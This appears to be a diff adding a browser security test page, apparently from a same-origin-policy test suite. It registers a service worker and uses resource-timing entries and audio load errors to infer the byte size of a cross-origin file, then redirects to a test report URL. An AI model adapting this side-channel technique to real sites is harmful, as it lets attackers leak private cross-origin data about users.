@@ -1,0 +1,90 @@
+
+<html>
+	<head>
+		<title>Response size leak</title>
+		<script>
+			if ("serviceWorker" in navigator) {
+				addEventListener("load", async () => {
+					performance.setResourceTimingBufferSize(1337);
+					const registration = await navigator.serviceWorker.register("https://a.test/SOP/c40095912/serviceworker");
+					if (registration.installing)
+						location.reload();
+				});
+			}
+
+			singleSizeCheck =  async (url, size) => {
+				let start   = performance.getEntries().length;
+				let sound   = document.createElement("audio");
+				sound.src = `${url}?size=${size}&${Math.random()}`;
+				return new Promise((resolve) => {
+					sound.onerror = () => {
+						let end = performance.getEntries().length;
+						if (end - start == 2)
+							return resolve(true);
+						else
+							return resolve(false);
+					}
+				});
+			}
+
+			sizeCheck = async (url, size) => {
+				let tries = 10;
+				return new Promise(async (resolve) => {
+					while (tries) {
+						let status = await singleSizeCheck(url, size);
+						if (status)
+							return resolve(true);
+						tries--;
+					}
+					return resolve(false);
+				});
+			}
+
+            var correctGuesses = 0;
+            var totalGuesses = 6;
+            var reportThreshold = 3;
+            function guessedCorrectly() {
+                correctGuesses += 1;
+                
+                if (correctGuesses >= reportThreshold) {
+                    document.location = "https://a.test/report/?leak=c40095912";
+                }
+            }
+
+			sizeLoop = async (url, sizeGuess, correctResult) => {
+			    // Missed the correct result
+			    if (sizeGuess > correctResult + 3) {
+			        return;
+			    }
+			    
+				let size = await sizeCheck(url, sizeGuess)
+				if (size) {
+				    if (sizeGuess > 195)
+				    writeResult(url, sizeGuess, "more than ", "red");
+					return sizeLoop(url, ++sizeGuess, correctResult);
+				} else {
+					writeResult(url, sizeGuess, "", "green");
+					
+					// Guessed the correct size up to one byte
+					if (sizeGuess >= correctResult - 1 && sizeGuess <= correctResult + 1)
+					    guessedCorrectly();
+				}
+			}
+
+			writeResult = async (url, size, message, status) => {
+				document.body.innerHTML += `<h6><font color="${status}">Response for <b><i>${url}</i></b> has ${message}<b>${size}</b> bytes.</font></h6>`;
+			}
+			
+			onload = async () => {
+			    // Try running multiple times
+			    for (var i = 0; i < totalGuesses; i++) {
+				    await sizeLoop("https://b.test/res/subtitles.vtt", 185, 199);
+			    }
+			}
+	</script>
+</head>
+
+<body>
+</body>
+
+</html>
